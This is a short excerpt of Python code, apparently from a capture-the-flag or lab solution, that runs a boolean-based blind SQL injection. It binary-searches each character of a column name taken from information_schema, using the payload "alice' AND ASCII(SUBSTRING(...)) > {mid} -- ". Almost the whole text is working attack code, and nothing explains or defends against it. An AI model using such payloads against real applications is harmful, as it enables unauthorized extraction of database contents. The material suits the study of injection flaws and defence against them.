...
for position in range(1, 33): 
    ...
    while low <= high:
        ...
        payload = f"alice' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '789b05678e7f955d2cf125b0c05616c9' LIMIT 1,1), {position}, 1)) > {mid} -- "
